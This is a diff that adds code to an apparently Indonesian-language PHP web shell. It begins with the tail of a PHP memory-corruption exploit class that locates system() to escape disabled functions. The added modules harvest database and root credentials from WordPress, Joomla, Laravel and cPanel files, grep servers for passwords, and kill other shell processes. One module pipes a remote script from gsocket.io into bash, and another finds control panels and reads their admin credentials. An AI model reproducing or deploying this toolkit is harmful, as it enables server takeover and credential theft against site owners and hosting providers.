+                $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
+                return $buf;
+            }
+     
+            private function free($addr) {
+                $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
+                $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
+     
+                $arr = [[], []];
+                set_error_handler(function() use (&$arr, &$buf, &$payload) {
+                    $arr = 1;
+                    $buf = str_repeat($payload, 1);
+                });
+                $arr[1] .= "x";
+            }
+     
+            private function rel_read($offset) {
+                return self::str2ptr($this->abc, $offset);
+            }
+     
+            private function rel_write($offset, $value, $n = 8) {
+                for ($i = 0; $i < $n; $i++) {
+                    $this->abc[$offset + $i] = chr($value & 0xff);
+                    $value >>= 8;
+                }
+            }
+     
+            private function read($addr, $n = 8) {
+                $this->rel_write(0x10, $addr - 0x10);
+                $value = strlen($this->helper->a);
+                if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
+                return $value;
+            }
+     
+            private function get_system($basic_funcs) {
+                $addr = $basic_funcs;
+                do {
+                    $f_entry = $this->read($addr);
+                    $f_name = $this->read($f_entry, 6);
+                    if($f_name === 0x6d6574737973) {
+                        return $this->read($addr + 8);
+                    }
+                    $addr += 0x20;
+                } while($f_entry !== 0);
+            }
+     
+            private function get_basic_funcs($addr) {
+                while(true) {
+                    $addr -= 0x10;
+                    if($this->read($addr, 4) === 0xA8 &&
+                        in_array($this->read($addr + 4, 4),
+                        [20180731, 20190902, 20200930, 20210902])) {
+                        $module_name_addr = $this->read($addr + 0x20);
+                        $module_name = $this->read($module_name_addr);
+                        if($module_name === 0x647261646e617473) {
+                            self::log("standard module @ 0x%x", $addr);
+                            return $this->read($addr + 0x28);
+                        }
+                    }
+                }
+            }
+     
+            private function log($format, $val = "") {
+                if(self::LOGGING) {
+                    printf("{$format}\n", $val);
+                }
+            }
+     
+            static function alloc($size) {
+                return str_shuffle(str_repeat("A", $size));
+            }
+     
+            static function str2ptr($str, $p = 0, $n = 8) {
+                $address = 0;
+                for($j = $n - 1; $j >= 0; $j--) {
+                    $address <<= 8;
+                    $address |= ord($str[$p + $j]);
+                }
+                return $address;
+            }
+        }
+        
+        try {
+            new Pwn($cmd);
+        } catch (Exception $e) {
+            echo "[!] Error: " . $e->getMessage() . "\n";
+            echo "[!] Exploit mungkin tidak kompatibel dengan versi PHP ini.\n";
+            echo "[!] Coba gunakan terminal biasa atau metode lain.\n";
+        }
+        
+        echo "</pre></div>";
+    }
+    
+    echo "<hr>";
+    echo "<font color='#888' size='1'>⚠️ Exploit Class Pwn — berfungsi di PHP 7.x/8.x tertentu</font>";
+    die(author());
+}
+
+
+// ============================================================
+// GRAB CONFIG — Ambil config dari berbagai CMS
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "grab") {
+    echo "<center><h3>🔥 GRAB CONFIG</h3><hr>";
+    echo "<font color='#aaa'>Ambil file konfigurasi dari WordPress, Joomla, Laravel, dll</font><br><br>";
+    
+    echo '<form method="post">';
+    echo 'Path: <input type="text" name="grab_path" class="up" value="' . $lokasi . '" style="width:300px;"><br><br>';
+    echo 'Pilih target: ';
+    echo '<select name="grab_target" class="up">';
+    echo '<option value="all">📁 Semua Config</option>';
+    echo '<option value="wp">WordPress (wp-config.php)</option>';
+    echo '<option value="joomla">Joomla (configuration.php)</option>';
+    echo '<option value="laravel">Laravel (.env)</option>';
+    echo '<option value="drupal">Drupal (settings.php)</option>';
+    echo '<option value="cpanel">cPanel (accesshash)</option>';
+    echo '<option value="mysql">MySQL (/root/.my.cnf)</option>';
+    echo '</select><br><br>';
+    echo '<input type="submit" name="run_grab" value="🔍 Grab Config" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_grab'])) {
+        $path = rtrim($_POST['grab_path'], '/');
+        $target = $_POST['grab_target'];
+        $results = [];
+        
+        function grabFile($file) {
+            if (file_exists($file) && is_readable($file)) {
+                $content = file_get_contents($file);
+                // Mask sensitive data
+                $content = preg_replace('/(password|pass|pwd|key|secret|token)\s*=\s*["\']([^"\']+)["\']/i', '$1 = "*****"', $content);
+                return $content;
+            }
+            return false;
+        }
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo "📊 GRAB CONFIG\n";
+        echo "═══════════════════════════════════════════════════════════\n\n";
+        
+        if ($target == 'all' || $target == 'wp') {
+            $wp_configs = komenb('find ' . $path . ' -maxdepth 5 -name wp-config.php -type f 2>/dev/null | head -10', $lokasi);
+            if ($wp_configs) {
+                echo "[WordPress] wp-config.php found:\n";
+                foreach (explode("\n", $wp_configs) as $wpc) {
+                    $wpc = trim($wpc);
+                    if ($wpc && file_exists($wpc)) {
+                        echo "  📄 " . $wpc . "\n";
+                        $content = file_get_contents($wpc);
+                        preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $db);
+                        preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $user);
+                        preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $pass);
+                        preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $host);
+                        if (!empty($db)) echo "    DB: " . $db[1] . "\n";
+                        if (!empty($user)) echo "    User: " . $user[1] . "\n";
+                        if (!empty($pass)) echo "    Pass: " . $pass[1] . "\n";
+                        if (!empty($host)) echo "    Host: " . $host[1] . "\n";
+                    }
+                }
+                echo "\n";
+            }
+        }
+        
+        if ($target == 'all' || $target == 'joomla') {
+            $joomla_configs = komenb('find ' . $path . ' -maxdepth 5 -name configuration.php -type f 2>/dev/null | head -10', $lokasi);
+            if ($joomla_configs) {
+                echo "[Joomla] configuration.php found:\n";
+                foreach (explode("\n", $joomla_configs) as $jml) {
+                    $jml = trim($jml);
+                    if ($jml && file_exists($jml)) {
+                        echo "  📄 " . $jml . "\n";
+                        $content = file_get_contents($jml);
+                        preg_match("/public\s*\$host\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $host);
+                        preg_match("/public\s*\$user\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $user);
+                        preg_match("/public\s*\$password\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $pass);
+                        preg_match("/public\s*\$db\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $db);
+                        if (!empty($db)) echo "    DB: " . $db[1] . "\n";
+                        if (!empty($user)) echo "    User: " . $user[1] . "\n";
+                        if (!empty($pass)) echo "    Pass: " . $pass[1] . "\n";
+                        if (!empty($host)) echo "    Host: " . $host[1] . "\n";
+                    }
+                }
+                echo "\n";
+            }
+        }
+        
+        if ($target == 'all' || $target == 'laravel') {
+            $laravel_envs = komenb('find ' . $path . ' -maxdepth 5 -name .env -type f 2>/dev/null | head -10', $lokasi);
+            if ($laravel_envs) {
+                echo "[Laravel] .env found:\n";
+                foreach (explode("\n", $laravel_envs) as $env) {
+                    $env = trim($env);
+                    if ($env && file_exists($env)) {
+                        echo "  📄 " . $env . "\n";
+                        $content = file_get_contents($env);
+                        preg_match("/DB_DATABASE\s*=\s*([^\s]+)/i", $content, $db);
+                        preg_match("/DB_USERNAME\s*=\s*([^\s]+)/i", $content, $user);
+                        preg_match("/DB_PASSWORD\s*=\s*([^\s]+)/i", $content, $pass);
+                        if (!empty($db)) echo "    DB: " . $db[1] . "\n";
+                        if (!empty($user)) echo "    User: " . $user[1] . "\n";
+                        if (!empty($pass)) echo "    Pass: " . $pass[1] . "\n";
+                    }
+                }
+                echo "\n";
+            }
+        }
+        
+        if ($target == 'all' || $target == 'cpanel') {
+            $hash = @file_get_contents('/root/.accesshash');
+            if ($hash) {
+                echo "[cPanel] Access hash found:\n";
+                echo "  📄 /root/.accesshash\n";
+                echo "  Hash: " . substr(str_replace("\n", '', $hash), 0, 50) . "...\n\n";
+            }
+        }
+        
+        if ($target == 'all' || $target == 'mysql') {
+            $mycnf = @file_get_contents('/root/.my.cnf');
+            if ($mycnf) {
+                echo "[MySQL] /root/.my.cnf found:\n";
+                preg_match("/password\s*=\s*([^\s]+)/i", $mycnf, $pass);
+                if (!empty($pass)) echo "  Password: " . $pass[1] . "\n\n";
+            }
+        }
+        
+        echo "═══════════════════════════════════════════════════════════\n";
+        echo "Selesai. Gunakan CONFIG SCANNER untuk scan lebih dalam.\n";
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// CONFIG SCANNER — Scan semua file konfigurasi
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "config") {
+    echo "<center><h3>🔥 CONFIG SCANNER</h3><hr>";
+    echo "<font color='#aaa'>Scan file konfigurasi dan ekstrak credential</font><br><br>";
+    
+    echo '<form method="post">';
+    echo 'Path: <input type="text" name="config_path" class="up" value="' . $lokasi . '" style="width:300px;"><br><br>';
+    echo 'Kedalaman: <input type="number" name="config_depth" class="up" value="4" min="1" max="10"><br><br>';
+    echo 'Cari: ';
+    echo '<select name="config_type" class="up">';
+    echo '<option value="all">Semua Config</option>';
+    echo '<option value="wp">wp-config.php</option>';
+    echo '<option value="env">.env</option>';
+    echo '<option value="config">configuration.php</option>';
+    echo '<option value="settings">settings.php</option>';
+    echo '<option value="db">database.php / db.php</option>';
+    echo '</select><br><br>';
+    echo '<input type="submit" name="run_config" value="🔍 Scan Config" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_config'])) {
+        $path = rtrim($_POST['config_path'], '/');
+        $depth = intval($_POST['config_depth']);
+        $type = $_POST['config_type'];
+        
+        $patterns = [];
+        if ($type == 'all' || $type == 'wp') $patterns[] = 'wp-config.php';
+        if ($type == 'all' || $type == 'env') $patterns[] = '.env';
+        if ($type == 'all' || $type == 'config') $patterns[] = 'configuration.php';
+        if ($type == 'all' || $type == 'settings') $patterns[] = 'settings.php';
+        if ($type == 'all' || $type == 'db') { $patterns[] = 'database.php'; $patterns[] = 'db.php'; }
+        if ($type == 'all') { $patterns = ['wp-config.php', '.env', 'configuration.php', 'settings.php', 'database.php', 'db.php', 'config.php', 'conf.php']; }
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo "📊 CONFIG SCANNER\n";
+        echo "═══════════════════════════════════════════════════════════\n";
+        echo "📂 Path: " . $path . "\n";
+        echo "📏 Depth: " . $depth . "\n";
+        echo "🔍 Patterns: " . implode(', ', $patterns) . "\n\n";
+        
+        $found = [];
+        foreach ($patterns as $pattern) {
+            $cmd = 'find ' . $path . ' -maxdepth ' . $depth . ' -name "' . $pattern . '" -type f 2>/dev/null | head -20';
+            $result = komenb($cmd, $lokasi);
+            if ($result) {
+                foreach (explode("\n", $result) as $file) {
+                    $file = trim($file);
+                    if ($file && file_exists($file) && is_readable($file)) {
+                        $found[] = $file;
+                        echo "📄 " . $file . "\n";
+                        $content = file_get_contents($file);
+                        // Ekstrak credential
+                        preg_match_all('/(password|pass|pwd|key|secret|token|api_key)\s*[:=]\s*["\']?([^"\'\s]+)["\']?/i', $content, $matches);
+                        if (!empty($matches[0])) {
+                            foreach ($matches[0] as $i => $match) {
+                                echo "  🔑 " . trim($match) . "\n";
+                            }
+                        }
+                        // DB khusus
+                        preg_match('/(db|database)\s*[:=]\s*["\']?([^"\'\s]+)["\']?/i', $content, $db);
+                        if (!empty($db)) echo "  📀 DB: " . $db[2] . "\n";
+                        preg_match('/(user|username)\s*[:=]\s*["\']?([^"\'\s]+)["\']?/i', $content, $user);
+                        if (!empty($user)) echo "  👤 User: " . $user[2] . "\n";
+                        echo "\n";
+                    }
+                }
+            }
+        }
+        
+        if (empty($found)) {
+            echo "✅ Tidak ditemukan file konfigurasi.\n";
+        } else {
+            echo "───────────────────────────────────────────────────────────\n";
+            echo "Total: " . count($found) . " file ditemukan.\n";
+        }
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// FIND PASSWORD — Cari password di file
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "findpass") {
+    echo "<center><h3>🔥 FIND PASSWORD</h3><hr>";
+    echo "<font color='#aaa'>Cari password, username, database di file</font><br><br>";
+    
+    echo '<form method="post">';
+    echo 'Path: <input type="text" name="find_path" class="up" value="' . $lokasi . '" style="width:300px;"><br><br>';
+    echo 'Cari keyword: <input type="text" name="find_keyword" class="up" value="password|pass|pwd|key|secret" style="width:200px;"><br><br>';
+    echo 'Ekstensi file: <input type="text" name="find_ext" class="up" value="php,txt,env,conf,ini,json,xml" style="width:200px;"><br><br>';
+    echo 'Kedalaman: <input type="number" name="find_depth" class="up" value="4" min="1" max="10"><br><br>';
+    echo '<input type="submit" name="run_findpass" value="🔍 Find Password" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_findpass'])) {
+        $path = rtrim($_POST['find_path'], '/');
+        $keyword = $_POST['find_keyword'];
+        $ext = $_POST['find_ext'];
+        $depth = intval($_POST['find_depth']);
+        
+        if (empty($keyword)) $keyword = 'password|pass|pwd|key|secret';
+        if (empty($ext)) $ext = 'php,txt,env,conf,ini,json,xml';
+        
+        $exts = explode(',', $ext);
+        $ext_pattern = implode(' -o ', array_map(function($e) { return "-name '*.$e'"; }, $exts));
+        
+        $cmd = 'find ' . $path . ' -maxdepth ' . $depth . ' -type f \\( ' . $ext_pattern . ' \\) -exec grep -HnE "' . $keyword . '" {} \\; 2>/dev/null | head -100';
+        $result = komenb($cmd, $lokasi);
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo "📊 FIND PASSWORD\n";
+        echo "═══════════════════════════════════════════════════════════\n";
+        echo "📂 Path: " . $path . "\n";
+        echo "🔍 Keyword: " . $keyword . "\n";
+        echo "📁 Ekstensi: " . $ext . "\n\n";
+        
+        if ($result) {
+            echo $result;
+        } else {
+            echo "✅ Tidak ditemukan credential.\n";
+        }
+        echo "</pre>";
+    }
+    die(author());
+}
+
+
+// ============================================================
+// 15. FILE SCAN — Deteksi File Baru / Diedit
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "filescan") {
+    echo "<center><h3>🔥 FILE SCAN — Deteksi Perubahan File</h3><hr>";
+    echo "<font color='#aaa'>Scan file baru ditambahkan atau diedit dalam periode tertentu</font><br><br>";
+    
+    $scan_path = isset($_GET['scan_path']) ? $_GET['scan_path'] : $lokasi;
+    $scan_path = rtrim($scan_path, '/');
+    
+    echo "📂 Path: <gold>" . $hsc($scan_path) . "</gold><br><br>";
+    
+    echo '<form method="post" action="' . $_SERVER['SCRIPT_NAME'] . '?loknya=' . urlencode($lokasi) . '&opsi=filescan&scan_path=' . urlencode($scan_path) . '">';
+    echo 'Waktu (menit terakhir): <input type="number" name="scan_minutes" class="up" value="5" min="1" max="1440" style="width:80px;"> menit<br><br>';
+    echo 'Scan mode: ';
+    echo '<select name="scan_mode" class="up">';
+    echo '<option value="mtime">📅 Berdasarkan Modified Time</option>';
+    echo '<option value="ctime">📅 Berdasarkan Created Time</option>';
+    echo '<option value="both">📅 Keduanya (mtime OR ctime)</option>';
+    echo '</select><br><br>';
+    echo 'Jenis file: <input type="text" name="scan_ext" class="up" placeholder="* atau php,txt,html" value="*" style="width:200px;"><br><br>';
+    echo '<input type="submit" name="run_filescan" value="🔍 Scan" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_filescan'])) {
+        $minutes = intval($_POST['scan_minutes']);
+        $mode = $_POST['scan_mode'];
+        $ext_filter = $_POST['scan_ext'];
+        
+        if ($minutes < 1) $minutes = 1;
+        $cutoff = time() - ($minutes * 60);
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo "📊 Hasil Scan\n";
+        echo "═══════════════════════════════════════════════════════════\n";
+        echo "📂 Path      : " . $hsc($scan_path) . "\n";
+        echo "⏱️  Rentang    : $minutes menit terakhir\n";
+        echo "🔍 Mode      : " . $mode . "\n";
+        echo "📁 Ekstensi  : " . $ext_filter . "\n";
+        echo "───────────────────────────────────────────────────────────\n\n";
+        
+        function scanFiles($dir, $cutoff, $mode, $ext_filter, &$results) {
+            if (!is_dir($dir)) return;
+            $files = scandir($dir);
+            foreach ($files as $file) {
+                if ($file === '.' || $file === '..') continue;
+                $path = $dir . '/' . $file;
+                if (is_dir($path)) {
+                    scanFiles($path, $cutoff, $mode, $ext_filter, $results);
+                } else {
+                    if ($ext_filter !== '*') {
+                        $exts = explode(',', $ext_filter);
+                        $ext = pathinfo($file, PATHINFO_EXTENSION);
+                        if (!in_array($ext, $exts)) continue;
+                    }
+                    
+                    $mtime = filemtime($path);
+                    $ctime = filectime($path);
+                    $found = false;
+                    $reason = '';
+                    
+                    if ($mode === 'mtime' && $mtime >= $cutoff) {
+                        $found = true; $reason = '📝 Modified';
+                    } elseif ($mode === 'ctime' && $ctime >= $cutoff) {
+                        $found = true; $reason = '📄 Created';
+                    } elseif ($mode === 'both' && ($mtime >= $cutoff || $ctime >= $cutoff)) {
+                        $found = true;
+                        if ($mtime >= $cutoff && $ctime >= $cutoff) { $reason = '📝 Modified + 📄 Created'; }
+                        elseif ($mtime >= $cutoff) { $reason = '📝 Modified'; }
+                        else { $reason = '📄 Created'; }
+                    }
+                    
+                    if ($found) {
+                        $size = filesize($path);
+                        $size_str = $size > 1024*1024 ? round($size/1024/1024,2).' MB' : ($size > 1024 ? round($size/1024,2).' KB' : $size.' B');
+                        $results[] = [
+                            'path' => $path,
+                            'reason' => $reason,
+                            'mtime' => date('Y-m-d H:i:s', $mtime),
+                            'ctime' => date('Y-m-d H:i:s', $ctime),
+                            'size' => $size_str
+                        ];
+                    }
+                }
+            }
+        }
+        
+        $results = [];
+        scanFiles($scan_path, $cutoff, $mode, $ext_filter, $results);
+        
+        usort($results, function($a, $b) { return strtotime($b['mtime']) - strtotime($a['mtime']); });
+        
+        if (empty($results)) {
+            echo "✅ Tidak ada file yang berubah dalam $minutes menit terakhir.\n";
+        } else {
+            echo "✅ Ditemukan " . count($results) . " file:\n\n";
+            echo str_repeat("─", 80) . "\n";
+            printf("%-5s %-50s %-15s %-12s %-10s\n", "No", "File", "Status", "Size", "Modified");
+            echo str_repeat("─", 80) . "\n";
+            $no = 1;
+            foreach ($results as $r) {
+                $name = basename($r['path']);
+                $dir_display = dirname($r['path']);
+                if (strlen($dir_display) > 30) $dir_display = '...' . substr($dir_display, -27);
+                $display = $dir_display . '/' . $name;
+                if (strlen($display) > 50) $display = substr($display, 0, 47) . '...';
+                printf("%-5s %-50s %-15s %-12s %-10s\n", 
+                    $no, 
+                    $display, 
+                    $r['reason'], 
+                    $r['size'], 
+                    $r['mtime']
+                );
+                $no++;
+            }
+            echo str_repeat("─", 80) . "\n";
+            
+            echo "\n📊 SUMMARY:\n";
+            echo "  Total files: " . count($results) . "\n";
+            $modified = array_filter($results, function($r) { return strpos($r['reason'], 'Modified') !== false; });
+            $created = array_filter($results, function($r) { return strpos($r['reason'], 'Created') !== false; });
+            echo "  📝 Modified: " . count($modified) . "\n";
+            echo "  📄 Created : " . count($created) . "\n";
+            
+            echo "\n🆕 5 File Terbaru:\n";
+            $top5 = array_slice($results, 0, 5);
+            foreach ($top5 as $r) {
+                echo "  • " . $r['path'] . " (" . $r['reason'] . " | " . $r['size'] . ")\n";
+            }
+        }
+        echo "</pre>";
+        die(author());
+    }
+    
+    echo '<hr><form method="get" action="' . $_SERVER['SCRIPT_NAME'] . '">';
+    echo 'Ganti path: <input type="text" name="scan_path" class="up" value="' . $hsc($scan_path) . '" style="width:300px;">';
+    echo '<input type="hidden" name="loknya" value="' . $hsc($lokasi) . '">';
+    echo '<input type="hidden" name="opsi" value="filescan">';
+    echo '<input type="submit" value="Ganti" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    die(author());
+}
+
+// ============================================================
+// 16. SHELL KILLER — Hentikan proses shell di latar belakang
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "killer") {
+    echo "<center><h3>🔥 SHELL KILLER</h3><hr>";
+    echo "<font color='#aaa'>Hentikan semua proses shell/terminal yang berjalan di latar belakang</font><br><br>";
+    
+    echo '<form method="post">';
+    echo 'Pilih aksi: ';
+    echo '<select name="kill_action" class="up">';
+    echo '<option value="list">📋 Lihat proses shell</option>';
+    echo '<option value="kill_all">☠️ Bunuh semua proses shell</option>';
+    echo '<option value="kill_by_user">☠️ Bunuh proses shell milik user tertentu</option>';
+    echo '<option value="kill_by_pid">☠️ Bunuh proses berdasarkan PID</option>';
+    echo '</select><br><br>';
+    echo 'User (jika kill_by_user): <input type="text" name="kill_user" class="up" placeholder="root" value="' . @get_current_user() . '"><br><br>';
+    echo 'PID (jika kill_by_pid): <input type="text" name="kill_pid" class="up" placeholder="12345"><br><br>';
+    echo '<input type="submit" name="run_killer" value="⚡ Execute" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_killer'])) {
+        $action = $_POST['kill_action'];
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:400px;overflow:auto;'>";
+        echo "[+] SHELL KILLER\n";
+        echo "═══════════════════════════════════════════════════════════\n";
+        
+        if ($action == 'list') {
+            echo "[+] Mencari proses shell yang berjalan...\n\n";
+            echo komend("ps aux | grep -E 'bash|sh|zsh|php|perl|python|nc|netcat|socat|ncat' | grep -v grep | grep -v 'killer'", $lokasi);
+        } elseif ($action == 'kill_all') {
+            echo "[+] Membunuh semua proses shell...\n\n";
+            $cmds = [
+                "pkill -f bash 2>/dev/null && echo '✅ bash processes killed'",
+                "pkill -f sh 2>/dev/null && echo '✅ sh processes killed'",
+                "pkill -f zsh 2>/dev/null && echo '✅ zsh processes killed'",
+                "pkill -f php 2>/dev/null && echo '✅ php processes killed'",
+                "pkill -f perl 2>/dev/null && echo '✅ perl processes killed'",
+                "pkill -f python 2>/dev/null && echo '✅ python processes killed'",
+                "pkill -f nc 2>/dev/null && echo '✅ netcat processes killed'",
+                "pkill -f socat 2>/dev/null && echo '✅ socat processes killed'",
+                "pkill -f ncat 2>/dev/null && echo '✅ ncat processes killed'",
+            ];
+            foreach ($cmds as $cmd) {
+                echo komend($cmd, $lokasi);
+            }
+            echo "\n[✔] Selesai! Proses shell dihentikan.\n";
+        } elseif ($action == 'kill_by_user') {
+            $user = $_POST['kill_user'];
+            if (empty($user)) { $user = get_current_user(); }
+            echo "[+] Membunuh proses shell milik user: $user\n\n";
+            $cmd = "pkill -u $user -f 'bash|sh|zsh|php|perl|python|nc|netcat|socat|ncat' 2>&1 && echo '✅ Processes for user $user killed' || echo '❌ No processes found or permission denied'";
+            echo komend($cmd, $lokasi);
+        } elseif ($action == 'kill_by_pid') {
+            $pid = intval($_POST['kill_pid']);
+            if ($pid > 0) {
+                echo "[+] Membunuh proses PID: $pid\n\n";
+                $cmd = "kill -9 $pid 2>&1 && echo '✅ PID $pid killed' || echo '❌ Failed to kill PID $pid'";
+                echo komend($cmd, $lokasi);
+            } else {
+                echo "[✘] PID tidak valid!\n";
+            }
+        }
+        echo "</pre>";
+        die(author());
+    }
+    die(author());
+}
+
+// ============================================================
+// 17. GS-UNINSTALL — Uninstall GS-Netcat (GS_UNDO=1)
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "gsuninstall") {
+    echo "<center><h3>🔥 GS-NETCAT UNINSTALLER</h3><hr>";
+    echo "<font color='#aaa'>Uninstall GS-Netcat dari sistem (GS_UNDO=1)</font><br><br>";
+    
+    $gs_check = shell_exec("which gs-netcat 2>/dev/null");
+    $gs_installed = !empty(trim($gs_check));
+    
+    if ($gs_installed) {
+        echo "✅ GS-Netcat terdeteksi di: <gold>" . $hsc(trim($gs_check)) . "</gold><br><br>";
+    } else {
+        echo "⚠️ GS-Netcat tidak terdeteksi di sistem.<br><br>";
+    }
+    
+    echo '<form method="post">';
+    echo 'Uninstall dengan GS_UNDO: ';
+    echo '<select name="gs_uninstall_mode" class="up">';
+    echo '<option value="undo">🔄 GS_UNDO=1 (uninstall resmi)</option>';
+    echo '<option value="force">💀 Force uninstall (hapus manual)</option>';
+    echo '</select><br><br>';
+    echo '<input type="submit" name="run_gsuninstall" value="🗑️ Uninstall" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_gsuninstall'])) {
+        $mode = $_POST['gs_uninstall_mode'];
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:400px;overflow:auto;'>";
+        echo "[+] GS-NETCAT UNINSTALL\n";
+        echo "═══════════════════════════════════════════════════════════\n";
+        
+        if ($mode == 'undo') {
+            echo "[+] Menjalankan GS_UNDO=1...\n\n";
+            $cmd = 'GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
+            echo "> " . $cmd . "\n\n";
+            $result = @shell_exec($cmd);
+            echo $result;
+            echo "\n[✔] GS-Netcat uninstall selesai.\n";
+        } else {
+            echo "[+] Force uninstall GS-Netcat...\n\n";
+            $cmds = [
+                "rm -f /usr/local/bin/gs-netcat 2>/dev/null && echo '✅ /usr/local/bin/gs-netcat removed'",
+                "rm -f /usr/bin/gs-netcat 2>/dev/null && echo '✅ /usr/bin/gs-netcat removed'",
+                "rm -f /bin/gs-netcat 2>/dev/null && echo '✅ /bin/gs-netcat removed'",
+                "rm -rf /tmp/gs-* 2>/dev/null && echo '✅ /tmp/gs-* removed'",
+                "rm -rf ~/.gs-netcat 2>/dev/null && echo '✅ ~/.gs-netcat removed'",
+                "pkill -f gs-netcat 2>/dev/null && echo '✅ gs-netcat processes killed'",
+            ];
+            foreach ($cmds as $cmd) {
+                echo komend($cmd, $lokasi);
+            }
+            echo "\n[✔] Force uninstall selesai.\n";
+        }
+        echo "</pre>";
+        die(author());
+    }
+    die(author());
+}
+
+// ============================================================
+// 18. PANEL FINDER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "panel") {
+    echo "<center><h3>🔥 PANEL FINDER</h3><hr>";
+    echo "<font color='#aaa'>Deteksi panel kontrol yang terinstall di server</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="find_panel" value="🔍 Scan Panel" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['find_panel'])) {
+        $isWin = strtoupper(substr(PHP_OS,0,3)) === 'WIN';
+        $panelInfo = "═══ PANEL FINDER ═══\n\n";
+        if($isWin){ $panelInfo .= "Windows: Check IIS Manager or Plesk\n"; }
+        else {
+            $panels = [
+                'cPanel' => ['check'=>'test -d /usr/local/cpanel && echo "YES"','url'=>'2083','user'=>'root','pass'=>'server root password or /root/.accesshash'],
+                'WHM' => ['check'=>'test -d /usr/local/cpanel && echo "YES"','url'=>'2087','user'=>'root','pass'=>'server root password'],
+                'Plesk' => ['check'=>'which plesk 2>/dev/null && plesk version 2>/dev/null || echo ""','url'=>'8443','user'=>'admin','pass'=>'plesk admin --show-password'],
+                'DirectAdmin' => ['check'=>'test -d /usr/local/directadmin && echo "YES"','url'=>'2222','user'=>'admin','pass'=>'/usr/local/directadmin/conf/admin.conf or mysql'],
+                'CWP' => ['check'=>'test -d /usr/local/cwp && echo "YES"','url'=>'2030','user'=>'root','pass'=>'/root/.cwp_admin_pass or mysql'],
+                'CyberPanel' => ['check'=>'test -d /usr/local/CyberPanel && echo "YES"','url'=>'8090','user'=>'admin','pass'=>'/etc/cyberpanel/adminPass or mysql'],
+                'VestaCP' => ['check'=>'test -d /usr/local/vesta && echo "YES"','url'=>'8083','user'=>'admin','pass'=>'v-change-user-password or mysql'],
+                'Webmin' => ['check'=>'test -d /usr/share/webmin && echo "YES"','url'=>'10000','user'=>'root or admin','pass'=>'system user password'],
+                'ISPConfig' => ['check'=>'test -d /usr/local/ispconfig && echo "YES"','url'=>'8080','user'=>'admin','pass'=>'/usr/local/ispconfig/security/ispconfig.pass'],
+                'HestiaCP' => ['check'=>'test -d /usr/local/hestia && echo "YES"','url'=>'8083','user'=>'admin','pass'=>'v-change-user-password or mysql'],
+            ];
+            foreach($panels as $name=>$p){
+                $found = trim(komenb($p['check'], $lokasi));
+                if($found === 'YES'){
+                    $panelInfo .= "[$name] DETECTED\n";
+                    $panelInfo .= "  URL: https://SERVER_IP:{$p['url']}\n";
+                    $panelInfo .= "  User: {$p['user']}\n";
+                    if(strpos($p['pass'],'2>/dev/null') !== false){
+                        $pass = trim(komenb($p['pass'], $lokasi));
+                        if($pass) $panelInfo .= "  Pass: $pass\n";
+                        else $panelInfo .= "  Pass: {$p['pass']}\n";
+                    } else $panelInfo .= "  Pass: {$p['pass']}\n";
+                    $ip = trim(komenb('curl -s ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk \'{print $1}\'', $lokasi));
+                    if($ip) $panelInfo = str_replace('SERVER_IP', $ip, $panelInfo);
+                    else $panelInfo = str_replace('SERVER_IP', 'YOUR_SERVER_IP', $panelInfo);
+                    $panelInfo .= "\n";
+                }
+            }
+            $panelInfo .= "\n--- CREDENTIAL DISCOVERY ---\n";
+            $cu = trim(komenb('whoami 2>/dev/null', $lokasi));
+            $panelInfo .= "Current user: $cu\n";
+            $hash = @file_get_contents('/root/.accesshash');
+            if($hash) $panelInfo .= "[cPanel] API access hash: ".substr(str_replace("\n",'',$hash),0,50)."...\n";
+            $myCnf = @file_get_contents('/root/.my.cnf');
